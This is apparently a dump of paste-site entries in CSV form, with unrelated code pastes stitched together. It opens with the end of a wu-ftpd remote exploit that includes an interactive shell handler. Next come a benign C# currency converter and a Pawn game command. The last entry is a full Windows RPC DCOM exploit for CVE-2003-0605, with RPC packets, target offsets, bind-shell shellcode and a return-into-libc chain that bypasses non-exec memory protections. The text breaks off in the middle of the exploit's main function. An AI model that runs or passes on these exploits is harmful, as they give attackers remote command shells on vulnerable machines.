if((sock=socket(AF_INET,SOCK_STREAM,(NRL)))==(FAD))
{
return(FAD);
}
sxp_addr.sin_family=AF_INET;
sxp_addr.sin_port=htons(u_port);
sxp_addr.sin_addr=*((struct in_addr*)sxp->h_addr);
bzero(&(sxp_addr.sin_zero),(SIN_ZR_SIZE));

if(connect(sock,(struct sockaddr *)&sxp_addr,sizeof(struct sockaddr))==(FAD))
{
return(FAD);
}
return(sock);
}

void conn_shell(int conn_sock)
{
int died;
int ex_t=(NRL);
char *command=(DEF_COMM);
char readbuf[(GET_R)];
fd_set rset;

memset((char *)readbuf,(NRL),sizeof(readbuf));
fprintf(stdout,"" [*] Send, command packet !\n\n"");
send(conn_sock,command,strlen(command),(NRL));

for(;;)
{
fflush(stdout);
FD_ZERO(&rset);
FD_SET(conn_sock,&rset);
FD_SET(STDIN_FILENO,&rset);
select(conn_sock+1,&rset,NULL,NULL,NULL);

if(FD_ISSET(conn_sock,&rset))
{
died=read(conn_sock,readbuf,sizeof(readbuf)-1);
if(died<=(NRL))
{
if(!ex_t)
return;
else
exit(NRL);
}
readbuf[died]=(NRL);
fprintf(stdout,""%s"",readbuf);
}
if(FD_ISSET(STDIN_FILENO,&rset))
{
died=read(STDIN_FILENO,readbuf,sizeof(readbuf)-1);
if(died>(NRL))
{
readbuf[died]=(NRL);
if(strstr(readbuf,""exit""))
ex_t=(SCS);
write(conn_sock,readbuf,died);
}
}
}
return;
}

void re_connt(int st_sock_va)
{
if(st_sock_va==(FAD))
{
fprintf(stdout,"" [ Fail ]\n\n"");
exit(FAD);
}
}

void banrl()
{
fprintf(stdout,""\n 0x82-WOOoou~Happy_new - wu-ftpd v2.6.2 off-by-one remote exploit.\n\n"");
}

/* eoc */

// milw0rm.com [2003-08-03]"
Hi9PyD4v,CurrencyConverter,UrayFenn,C#,Saturday 17th of February 2024 10:24:53 PM CDT,"namespace CurrencyConverter
{
    internal class Program
    {
        static void Main(string[] args)
        {
            float rub = 10000;
            float usd = 5000;
            float eur = 1000;
            float rubToUsd = 54;
            float rubToEur = 62;
            float usdToRub = 17;
            float usdToEur = 4;
            float eurToRub = 13;
            float eurToUsd = 9;
            string desiredOperation;
            float currencyCount;
            bool canExchangeCurrency = true;
            Console.WriteLine("" ."");
            Console.WriteLine($""   {rub} , {usd} , {eur} ."");

            while (canExchangeCurrency)
            {
                const string CurrencyRubToUsd = ""1"";
                const string CurrencyRubToEur = ""2"";
                const string CurrencyUsdToRub = ""3"";
                const string CurrencyUsdToEur = ""4"";
                const string CurrencyEurToRub = ""5"";
                const string CurrencyEurToUsd = ""6"";
                const string CommandExit = ""7"";

                Console.WriteLine(""\n   :"");
                Console.WriteLine($""{CurrencyRubToUsd} -    ."");
                Console.WriteLine($""{CurrencyRubToEur} -    ."");
                Console.WriteLine($""{CurrencyUsdToRub} -    ."");
                Console.WriteLine($""{CurrencyUsdToEur} -    ."");
                Console.WriteLine($""{CurrencyEurToRub} -    ."");
                Console.WriteLine($""{CurrencyEurToUsd} -    ."");
                Console.WriteLine($""{CommandExit} -   .\n"");
                desiredOperation = Console.ReadLine();

                switch (desiredOperation)
                {
                    case CurrencyRubToUsd:
                        Console.WriteLine(""   .\n    ?"");
                        currencyCount = Convert.ToSingle(Console.ReadLine());

                        if (rub >= currencyCount)
                        {
                            rub -= currencyCount;
                            usd += currencyCount / rubToUsd;
                            Console.WriteLine($""   {rub} , {usd} , {eur} ."");
                        }
                        else
                        {
                            Console.WriteLine(""  "");
                        }

                        break;

                    case CurrencyRubToEur:
                        Console.WriteLine(""   .\n    ?"");
                        currencyCount = Convert.ToSingle(Console.ReadLine());

                        if (rub >= currencyCount)
                        {
                            rub -= currencyCount;
                            eur += currencyCount / rubToEur;
                            Console.WriteLine($""   {rub} , {usd} , {eur} ."");
                        }
                        else
                        {
                            Console.WriteLine(""  "");
                        }

                        break;

                    case CurrencyUsdToRub:
                        Console.WriteLine(""   .\n    ?"");
                        currencyCount = Convert.ToSingle(Console.ReadLine());

                        if (usd >= currencyCount)
                        {
                            usd -= currencyCount;
                            rub += currencyCount / usdToRub;
                            Console.WriteLine($""   {rub} , {usd} , {eur} ."");
                        }
                        else
                        {
                            Console.WriteLine(""  "");
                        }

                        break;

                    case CurrencyUsdToEur:
                        Console.WriteLine(""   .\n    ?"");
                        currencyCount = Convert.ToSingle(Console.ReadLine());

                        if (usd >= currencyCount)
                        {
                            usd -= currencyCount;
                            eur += currencyCount / usdToEur;
                            Console.WriteLine($""   {rub} , {usd} , {eur} ."");
                        }
                        else
                        {
                            Console.WriteLine(""  "");
                        }

                        break;

                    case CurrencyEurToRub:
                        Console.WriteLine(""   .\n    ?"");
                        currencyCount = Convert.ToSingle(Console.ReadLine());

                        if (eur >= currencyCount)
                        {
                            eur -= currencyCount;
                            rub += currencyCount / eurToRub;
                            Console.WriteLine($""   {rub} , {usd} , {eur} ."");
                        }
                        else
                        {
                            Console.WriteLine(""  "");
                        }

                        break;

                    case CurrencyEurToUsd:
                        Console.WriteLine(""   .\n    ?"");
                        currencyCount = Convert.ToSingle(Console.ReadLine());

                        if (eur >= currencyCount)
                        {
                            eur -= currencyCount;
                            usd += currencyCount / eurToUsd;
                            Console.WriteLine($""   {rub} , {usd} , {eur} ."");
                        }
                        else
                        {
                            Console.WriteLine(""  "");
                        }

                        break;

                    case CommandExit:
                        Console.WriteLine(""      "");
                        Console.ReadKey();
                        canExchangeCurrency = false;
                        break;

                    default:
                        Console.WriteLine(""  "");
                        break;
                }
            }
        }
    }
}"
99YduWmv,training,smcspals,C++,Saturday 17th of February 2024 09:57:21 PM CDT,"CMD:training(playerid)
{
	if(GetPVarInt(playerid, ""onafk"") == 1)
		return SendErroMessage(playerid, ""Voc est no (/lounge), use (/lounge) para sair!"");

    new Float:Armour;
    GetPlayerArmour(playerid, Armour);

    if(Armour < 100)
        return SendErroMessage(playerid, ""Voc est com o colete baixo!"");

    if (GetPVarInt(playerid, ""training"") == 1)
	{
        SetPVarInt(playerid, ""training"", 0);
		SetPlayerInterior(playerid, 0);
        SpawnPlayer(playerid);
		SendClientMessage(playerid, COLOR_LIGHTTRED, ""[Treino] Voc saiu da arena de treino!"");
		
        PlayerTextDrawHide(playerid, InfoStats[playerid][0]);
		
        for(new i; i < sizeof(trnActors); i++)
			OnActorStreamOut(trnActors[i], playerid);
			
		PlayerInfo[playerid][pFsDeagle] = 0;
		PlayerInfo[playerid][pFsShotgun] = 0;
		PlayerInfo[playerid][pFsSniper] = 0;
		
		PlayerInfo[playerid][pHsDeagle] = 0;
		PlayerInfo[playerid][pHsShotgun] = 0;
		PlayerInfo[playerid][pHsSniper] = 0;
		
		PlayerInfo[playerid][pAcDeagle] = 0;
		PlayerInfo[playerid][pAcShotgun] = 0;
		PlayerInfo[playerid][pAcSniper] = 0;
	}
	else
	{
		SetPlayerVirtualWorld(playerid, AFK_WORLD);
		SetPlayerPos(playerid, -975.975708,1060.983032,1345.671875);
		SetPlayerInterior(playerid, 10);
		SetPlayerFacingAngle(playerid, 269.0509);
		SetCameraBehindPlayer(playerid);
		ResetPlayerWeapons(playerid);
		GivePlayerWeapon(playerid, 25, 9999);
		GivePlayerWeapon(playerid, 24, 9999);
		GivePlayerWeapon(playerid, 34, 9999);
		SetPlayerArmour(playerid, 100);
		SetPlayerHealth(playerid, 100);
		SetPVarInt(playerid, ""training"", 1);
		SendClientMessageToAllEx(COLOR_LIGHTTRED, ""[Treino] %s foi para a arena de treino (/training)"", Nome(playerid));

		
		PlayerTextDrawShow(playerid, InfoStats[playerid][0]);
		
        for(new i; i < sizeof(trnActors); i++)
			OnActorStreamIn(trnActors[i], playerid);
			
		PlayerInfo[playerid][pFsDeagle] = 0;
		PlayerInfo[playerid][pFsShotgun] = 0;
		PlayerInfo[playerid][pFsSniper] = 0;
		
		PlayerInfo[playerid][pHsDeagle] = 0;
		PlayerInfo[playerid][pHsShotgun] = 0;
		PlayerInfo[playerid][pHsSniper] = 0;
		
		PlayerInfo[playerid][pAcDeagle] = 0;
		PlayerInfo[playerid][pAcShotgun] = 0;
		PlayerInfo[playerid][pAcSniper] = 0;

	}
    return 1;
}"
VKCFDK2i,Microsoft Windows XP/2000 - RPC Remote Non Exec Memory - CVE-2003-0605,FlyFar,C,Saturday 17th of February 2024 09:54:07 PM CDT,"/*
 * have you recently bought one of those expensive new windows security products
 * on the market? do you think you now have strong protection?
 * Look again:
 *
 * *rpc!exec* 
 * by ins1der (trixterjack yahoo com)
 *
 * windows remote return into libc exploit!
 *
 * remote rpc exploit breaking non exec memory protection schemes
 * tested against : 
 *		OverflowGuard 
 *		StackDefender (kernel32 imagebase randomization:O nice try guys.)
 *		 	
 *
 * currently breaking:
 * Windows 2000 SP0 (english)
 * Windows XP SP0 (english)
 *
 * to get new offsets use this:
 * ------------------------------
 * 	#include <windows.h>
 *	#include <stdio.h>
 *	
 *	int main()
 *	{
 *	HANDLE h1,h2;
 *	unsigned long addr1,addr2,addr3,addr4;
 *	h1=LoadLibrary(""ntdll.dll"");
 *	h2=LoadLibrary(""MSVCRT.dll"");
 *	addr1=(unsigned long)GetProcAddress(h1,""NtAllocateVirtualMemory"");
 *	addr2=(unsigned long)GetProcAddress(h2,""memcpy"");
 *	addr3=(unsigned long)GetProcAddress(h1,""NtProtectVirtualMemory"");
 *		for (addr4=addr1;addr4<addr1+0xffff;addr4++)
 *			{
 *			if (!memcmp((void*)addr4,""\xc9\xc3"",2)) break;
 *			}
 *	printf(""0x%x 0x%x 0x%x 0x%x\n"",addr1,addr2,addr3,addr4);
 *	return 0;
 *	}
 * -----------------------------
 * to get the last offset use a standard rpc dcom exploit with the last
 * \x90\x90 before the shellcode replaced with \xcd\x21. run the exploit
 * and read the drwatson logs. substract 0xA5 from the fault address.
 *
 *
 * 	Shouts go to: 
 *		w00pz, SpaceCow, Int3, lacroix, misu200, j00(xor),
 *		s0ny, crisis, and to all my true friends.
 *	
 *	
 * 	Enjoy!
 * 
 */

#include <sys/socket.h>
#include <netinet/in.h>

unsigned char bindstr[]={
0x05,0x00,0x0B,0x03,0x10,0x00,0x00,0x00,0x48,0x00,0x00,0x00,0x7F,0x00,0x00,0x00,
0xD0,0x16,0xD0,0x16,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x01,0x00,0x01,0x00,
0xa0,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,
0x00,0x00,0x00,0x00,0x04,0x5D,0x88,0x8A,0xEB,0x1C,0xC9,0x11,0x9F,0xE8,0x08,0x00,
0x2B,0x10,0x48,0x60,0x02,0x00,0x00,0x00};

unsigned char request1[]={
0x05,0x00,0x00,0x03,0x10,0x00,0x00,0x00,0xE8,0x03,0x00,0x00,0xE5,0x00,0x00,0x00,
0xD0,0x03,0x00,0x00,0x01,0x00,0x04,0x00,0x05,0x00,0x06,0x00,0x01,0x00,0x00,0x00,
0x00,0x00,0x00,0x00,0x32,0x24,0x58,0xFD,0xCC,0x45,0x64,0x49,0xB0,0x70,0xDD,0xAE,
0x74,0x2C,0x96,0xD2,0x60,0x5E,0x0D,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
0x70,0x5E,0x0D,0x00,0x02,0x00,0x00,0x00,0x7C,0x5E,0x0D,0x00,0x00,0x00,0x00,0x00,
0x10,0x00,0x00,0x00,0x80,0x96,0xF1,0xF1,0x2A,0x4D,0xCE,0x11,0xA6,0x6A,0x00,0x20,
0xAF,0x6E,0x72,0xF4,0x0C,0x00,0x00,0x00,0x4D,0x41,0x52,0x42,0x01,0x00,0x00,0x00,
0x00,0x00,0x00,0x00,0x0D,0xF0,0xAD,0xBA,0x00,0x00,0x00,0x00,0xA8,0xF4,0x0B,0x00,
0x60,0x03,0x00,0x00,0x60,0x03,0x00,0x00,0x4D,0x45,0x4F,0x57,0x04,0x00,0x00,0x00,
0xA2,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,
0x38,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,
0x00,0x00,0x00,0x00,0x30,0x03,0x00,0x00,0x28,0x03,0x00,0x00,0x00,0x00,0x00,0x00,
0x01,0x10,0x08,0x00,0xCC,0xCC,0xCC,0xCC,0xC8,0x00,0x00,0x00,0x4D,0x45,0x4F,0x57,
0x28,0x03,0x00,0x00,0xD8,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x02,0x00,0x00,0x00,
0x07,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
0x00,0x00,0x00,0x00,0xC4,0x28,0xCD,0x00,0x64,0x29,0xCD,0x00,0x00,0x00,0x00,0x00,
0x07,0x00,0x00,0x00,0xB9,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,
0x00,0x00,0x00,0x46,0xAB,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,
0x00,0x00,0x00,0x46,0xA5,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,
0x00,0x00,0x00,0x46,0xA6,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,
0x00,0x00,0x00,0x46,0xA4,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,
0x00,0x00,0x00,0x46,0xAD,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,
0x00,0x00,0x00,0x46,0xAA,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,
0x00,0x00,0x00,0x46,0x07,0x00,0x00,0x00,0x60,0x00,0x00,0x00,0x58,0x00,0x00,0x00,
0x90,0x00,0x00,0x00,0x40,0x00,0x00,0x00,0x20,0x00,0x00,0x00,0x78,0x00,0x00,0x00,
0x30,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x01,0x10,0x08,0x00,0xCC,0xCC,0xCC,0xCC,
0x50,0x00,0x00,0x00,0x4F,0xB6,0x88,0x20,0xFF,0xFF,0xFF,0xFF,0x00,0x00,0x00,0x00,
0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x10,0x08,0x00,0xCC,0xCC,0xCC,0xCC,
0x48,0x00,0x00,0x00,0x07,0x00,0x66,0x00,0x06,0x09,0x02,0x00,0x00,0x00,0x00,0x00,
0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0x10,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x78,0x19,0x0C,0x00,
0x58,0x00,0x00,0x00,0x05,0x00,0x06,0x00,0x01,0x00,0x00,0x00,0x70,0xD8,0x98,0x93,
0x98,0x4F,0xD2,0x11,0xA9,0x3D,0xBE,0x57,0xB2,0x00,0x00,0x00,0x32,0x00,0x31,0x00,
0x01,0x10,0x08,0x00,0xCC,0xCC,0xCC,0xCC,0x80,0x00,0x00,0x00,0x0D,0xF0,0xAD,0xBA,
0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
0x18,0x43,0x14,0x00,0x00,0x00,0x00,0x00,0x60,0x00,0x00,0x00,0x60,0x00,0x00,0x00,
0x4D,0x45,0x4F,0x57,0x04,0x00,0x00,0x00,0xC0,0x01,0x00,0x00,0x00,0x00,0x00,0x00,
0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0x3B,0x03,0x00,0x00,0x00,0x00,0x00,0x00,
0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0x00,0x00,0x00,0x00,0x30,0x00,0x00,0x00,
0x01,0x00,0x01,0x00,0x81,0xC5,0x17,0x03,0x80,0x0E,0xE9,0x4A,0x99,0x99,0xF1,0x8A,
0x50,0x6F,0x7A,0x85,0x02,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,
0x01,0x10,0x08,0x00,0xCC,0xCC,0xCC,0xCC,0x30,0x00,0x00,0x00,0x78,0x00,0x6E,0x00,
0x00,0x00,0x00,0x00,0xD8,0xDA,0x0D,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
0x20,0x2F,0x0C,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x03,0x00,0x00,0x00,
0x00,0x00,0x00,0x00,0x03,0x00,0x00,0x00,0x46,0x00,0x58,0x00,0x00,0x00,0x00,0x00,
0x01,0x10,0x08,0x00,0xCC,0xCC,0xCC,0xCC,0x10,0x00,0x00,0x00,0x30,0x00,0x2E,0x00,
0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
0x01,0x10,0x08,0x00,0xCC,0xCC,0xCC,0xCC,0x68,0x00,0x00,0x00,0x0E,0x00,0xFF,0xFF,
0x68,0x8B,0x0B,0x00,0x02,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};

unsigned char request2[]={
0x20,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x20,0x00,0x00,0x00,0x5C,0x00,0x5C,0x00
};

unsigned char request3[]={
0x5C,0x00,0x43,0x00,0x24,0x00,0x5C,0x00,0x31,0x00,0x32,0x00,0x33,0x00,0x34,0x00,
0x35,0x00,0x36,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,
0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,
0x31,0x00,0x2E,0x00,0x64,0x00,0x6F,0x00,0x63,0x00,0x00,0x00};

unsigned char request4[]={
0x01,0x10,0x08,0x00,0xCC,0xCC,0xCC,0xCC,0x20,0x00,0x00,0x00,0x30,0x00,0x2D,0x00,
0x00,0x00,0x00,0x00,0x88,0x2A,0x0C,0x00,0x02,0x00,0x00,0x00,0x01,0x00,0x00,0x00,
0x28,0x8C,0x0C,0x00,0x01,0x00,0x00,0x00,0x07,0x00,0x00,0x00,0x00,0x00,0x00,0x00
};


struct offset
{
char *description;
unsigned long valloc;
unsigned long amemcpy;
unsigned long vprot;
unsigned long ret;
unsigned long frame;
};
struct offset targets[]=
{
	{""Windows 2000 SP0 (english)"",
		0x77f95da9,
	    	0x78001194,
		0x77f82ffb,
		0x77f96800,
		0x52f770
	}
	,
	{""Windows XP   SP0 (english)"",
	        0x77f7e4c3,
	        0x77c42e10,
	        0x77f7ec43,
	        0x77f80a07,
	        0x5bf79c
	}
	,
	{NULL,0,0,0,0,0}
};


unsigned char shell[]=
     	
	""\x46\x00\x58\x00""
	""\x4E\x00\x42\x00""
	""\x46\x00\x58\x00""
	""\x46\x00\x58\x00""
	
	""\x4E\x00\x42\x00\x46\x00\x58\x00\x46\x00\x58\x00\x46\x00\x58\x00""

	""\xff\xff\xff\xff""
  	""\xff\xff\xff\xff"" 

    	""\xcc\xe0\xfd\x7f""
    	""\xcc\xe0\xfd\x7f""

    	""\x90\x90\x90\x90""
	""\x90\x90\x90\x90""
	""\x90\x90\x90\x90""
	""\x90\x90\x90\x90""
    	""\x90\x90\x90\x90""
	""\x90\x90\x90\x90""
	""\x90\x90\x90\x90""
	""\x90\x90\x90\x90""
	""\x90\x90\x90\x90""

	""\x90\x90\x90\x90""
    	""\x90\x90\x90\x90""
	""\x90\x90\x90\x90""
	""\x90\x90\x90\x90""
	""\x90\x90\x90\x90""
    	""\x90\x90\x90\x90""
	
	""\x90\x90\x90\x90""
	""\x90\x90\x90\x90""
	""\x90\x90\x90\x90""
    	""\x90\x90\x90\x90""
	""\x90\x90\x90\x90""
	""\x90\x90\x90\x90""
	""\x90\x90\x90\x90""
	""\x90\x90\x90\x90""
    
	
    ""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90""
    ""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90""
    ""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90""
    ""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90""
    ""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90""
    
    ""\x83\xec\x34\x8b\xf4\xe8\x47\x01\x00\x00\x89\x06\xff\x36\x68\x8e""
    ""\x4e\x0e\xec\xe8\x61\x01\x00\x00\x89\x46\x08\xff\x36\x68\xad\xd9""
    ""\x05\xce\xe8\x52\x01\x00\x00\x89\x46\x0c\x68\x6c\x6c\x00\x00\x68""
    ""\x33\x32\x2e\x64\x68\x77\x73\x32\x5f\x54\xff\x56\x08\x89\x46\x04""
    ""\xff\x36\x68\x72\xfe\xb3\x16\xe8\x2d\x01\x00\x00\x89\x46\x10\xff""
    ""\x36\x68\xef\xce\xe0\x60\xe8\x1e\x01\x00\x00\x89\x46\x14\xff\x76""
    ""\x04\x68\xcb\xed\xfc\x3b\xe8\x0e\x01\x00\x00\x89\x46\x18\xff\x76""
    ""\x04\x68\xd9\x09\xf5\xad\xe8\xfe\x00\x00\x00\x89\x46\x1c\xff\x76""
    ""\x04\x68\xa4\x1a\x70\xc7\xe8\xee\x00\x00\x00\x89\x46\x20\xff\x76""
    ""\x04\x68\xa4\xad\x2e\xe9\xe8\xde\x00\x00\x00\x89\x46\x24\xff\x76""
    ""\x04\x68\xe5\x49\x86\x49\xe8\xce\x00\x00\x00\x89\x46\x28\xff\x76""
    ""\x04\x68\xe7\x79\xc6\x79\xe8\xbe\x00\x00\x00\x89\x46\x2c\x33\xff""
    ""\x81\xec\x90\x01\x00\x00\x54\x68\x01\x01\x00\x00\xff\x56\x18\x50""
    ""\x50\x50\x50\x40\x50\x40\x50\xff\x56\x1c\x8b\xd8\x57\x57\x68\x02""
    ""\x00\x1c\x07\x8b\xcc\x6a\x16\x51\x53\xff\x56\x20\x57\x53\xff\x56""
    ""\x24\x57\x51\x53\xff\x56\x28\x8b\xd0\x68\x65\x78\x65\x00\x68\x63""
    ""\x6d\x64\x2e\x89\x66\x30\x83\xec\x54\x8d\x3c\x24\x33\xc0\x33\xc9""
    ""\x83\xc1\x15\xab\xe2\xfd\xc6\x44\x24\x10\x44\xfe\x44\x24\x3d\x89""
    ""\x54\x24\x48\x89\x54\x24\x4c\x89\x54\x24\x50\x8d\x44\x24\x10\x54""
    ""\x50\x51\x51\x51\x6a\x01\x51\x51\xff\x76\x30\x51\xff\x56\x10\x8b""
    ""\xcc\x6a\xff\xff\x31\xff\x56\x0c\x8b\xc8\x57\xff\x56\x2c\xff\x56""
    ""\x14\x55\x56\x64\xa1\x30\x00\x00\x00\x85\xc0\x78\x0c\x8b\x40\x0c""
    ""\x8b\x70\x1c\xad\x8b\x68\x08\xeb\x09\x8b\x40\x34\x8b\xa8\xb8\x00""
    ""\x00\x00\x8b\xc5\x5e\x5d\xc2\x04\x00\x53\x55\x56\x57\x8b\x6c\x24""
    ""\x18\x8b\x45\x3c\x8b\x54\x05\x78\x03\xd5\x8b\x4a\x18\x8b\x5a\x20""
    ""\x03\xdd\xe3\x32\x49\x8b\x34\x8b\x03\xf5\x33\xff\xfc\x33\xc0\xac""
    ""\x3a\xc4\x74\x07\xc1\xcf\x0d\x03\xf8\xeb\xf2\x3b\x7c\x24\x14\x75""
    ""\xe1\x8b\x5a\x24\x03\xdd\x66\x8b\x0c\x4b\x8b\x5a\x1c\x03\xdd\x8b""
    ""\x04\x8b\x03\xc5\xeb\x02\x33\xc0\x8b\xd5\x5f\x5e\x5d\x5b\xc2\x04""
    ""\x00\x90\x90\x90\x80\xbf\x32\x94\x80\xbf\x32\x94"";
 

struct frame1
{
unsigned long frame0;
unsigned long ret;
}fr1;

struct retstruct
{
unsigned long frame1;
unsigned long valloc;
unsigned long ret1;
unsigned long dummy1;
unsigned long pointer11;
unsigned long zero;
unsigned long pointer12;
unsigned long type;
unsigned long prot;

unsigned long frame2;
unsigned long amemcpy;
unsigned long ret2;
unsigned long dest;
unsigned long src;
unsigned long size2;

unsigned long frame3;
unsigned long vprot;
unsigned long ret3;
unsigned long dummy2;
unsigned long pointer21;
unsigned long pointer22;
unsigned long newprot;
unsigned long oldprot;
}rets;

void prepare_ret(int id)
{
  rets.type=0x3000;
  rets.prot=0x4;
  rets.newprot=0x20;

  rets.valloc=targets[id].valloc;
  rets.amemcpy=targets[id].amemcpy;
  rets.vprot=targets[id].vprot;
  fr1.ret=rets.ret1=rets.ret2=targets[id].ret;
  fr1.frame0=targets[id].frame;

  rets.frame1=fr1.frame0+9*4;
  rets.frame2=rets.frame1+6*4;
  rets.oldprot=fr1.frame0;
  rets.frame3=rets.frame1;
  rets.size2=sizeof(shell);

  rets.src=fr1.frame0;
  rets.dest=0x55555000;
  rets.ret3=0x5555506c;

  rets.dummy1=rets.dummy2=0xffffffff;
  rets.zero=0;

  *(int*)(shell+148)=0x55555000;
  *(int*)(shell+152)=sizeof(shell);

  *(int*)(shell+140)=0x55555000;
  *(int*)(shell+144)=sizeof(shell);

  rets.pointer11=fr1.frame0+92;
  rets.pointer12=fr1.frame0+96;
  rets.pointer21=fr1.frame0+100;
  rets.pointer22=fr1.frame0+104;

  memcpy(shell+32,&fr1,sizeof(fr1));
  memcpy(shell+48,&rets,sizeof(rets));
}

void entershell(int sock)
{
  char buf[3000];
  fd_set  fdr;
  int rs;

  FD_ZERO(&fdr);
  FD_SET(sock,&fdr);
  FD_SET(0,&fdr);

  for(;;) 
  {
    FD_SET(sock, &fdr);
    FD_SET(0, &fdr);
    if(select(FD_SETSIZE,&fdr,NULL,NULL,NULL)<0) break;
    if(FD_ISSET(sock, &fdr)) 
      {
        if((rs=read(sock,buf,sizeof(buf)))<0)
        {
           printf(""connection lost\n"");
           return;
        }
        if(write(1,buf,rs)<0) break;
      }

    if(FD_ISSET(0,&fdr)) 
      {
        if((rs=read(0,buf,sizeof(buf)))<0)
        {
           printf(""[-] Connection lost..\n"");
           exit(1);
        }
        if (write(sock,buf,rs) < 0) break;
      }
        usleep(100);
   }
        
   printf(""connection closed\n"");
 
   return;
}


int main(int argc, char **argv)
{
    
    int sock,i,len1;
    struct sockaddr_in sin;
    unsigned char buf1[0x1000],buf2[0x1000];

    if(argc<3)
    {   
	printf(""###############################\n"");
	printf(""return into libc rpc exploit\n"");
	printf(""ins1der 2003\n"");
	printf(""*****************************************\n"");
        printf(""usage: %s <ip> <id>\n"", argv[0]);
	printf(""*****************************************\n"");
        printf(""targets:\n"");
	printf(""-----------------------------------------\n"");
        for (i=0;targets[i].description!= NULL;i++)
            {
            printf(""%d\t%s\n"",i,targets[i].description);   
            }
	printf(""-----------------------------------------\n"");
        
        return 0;
    }
	
		
 	

    printf(""Exploiting %s...\n"",argv[1]);
  	
    prepare_ret(atoi(argv[2]));
    
    sin.sin_family=AF_INET;
    sin.sin_addr.s_addr=inet_addr(argv[1]);
    sin.sin_port=htons(135);

    if ((sock=socket(AF_INET,SOCK_STREAM,0))==-1)
    {
        perror(""socket "");
        return 0;
    }
    
    if(connect(sock,(struct sockaddr*)&sin, sizeof(sin)))
    {
        perror(""connect "");
        return 0;
    }
    
    memcpy(buf2,request1,sizeof(request1));
    len1=sizeof(request1);
    
    *(unsigned long *)(request2)=*(unsigned long *)(request2)+sizeof(shell)/2;  
    *(unsigned long *)(request2+8)=*(unsigned long *)(request2+8)+sizeof(shell)/2;
    
    memcpy(buf2+len1,request2,sizeof(request2));
    len1=len1+sizeof(request2);
    memcpy(buf2+len1,shell,sizeof(shell));
    len1=len1+sizeof(shell);
    memcpy(buf2+len1,request3,sizeof(request3));
    len1=len1+sizeof(request3);
    memcpy(buf2+len1,request4,sizeof(request4));
    len1=len1+sizeof(request4);
    
    *(unsigned long *)(buf2+8)=*(unsigned long *)(buf2+8)+sizeof(shell)-0xc;
    *(unsigned long *)(buf2+0x10)=*(unsigned long *)(buf2+0x10)+sizeof(shell)-0xc;
 
    *(unsigned long *)(buf2+0x80)=*(unsigned long *)(buf2+0x80)+sizeof(shell)-0xc;
    *(unsigned long *)(buf2+0x84)=*(unsigned long *)(buf2+0x84)+sizeof(shell)-0xc;
    *(unsigned long *)(buf2+0xb4)=*(unsigned long *)(buf2+0xb4)+sizeof(shell)-0xc;
    *(unsigned long *)(buf2+0xb8)=*(unsigned long *)(buf2+0xb8)+sizeof(shell)-0xc;
    *(unsigned long *)(buf2+0xd0)=*(unsigned long *)(buf2+0xd0)+sizeof(shell)-0xc;
    *(unsigned long *)(buf2+0x18c)=*(unsigned long *)(buf2+0x18c)+sizeof(shell)-0xc;
    
    if (send(sock,(char*)bindstr,sizeof(bindstr),0)==-1)
    {
            perror(""send"");
            return 0;
    }

    recv(sock,(char*)buf1,1000,0);
    
    if (send(sock,(char*)buf2,len1,0)== -1)
    {
            perror(""send"");
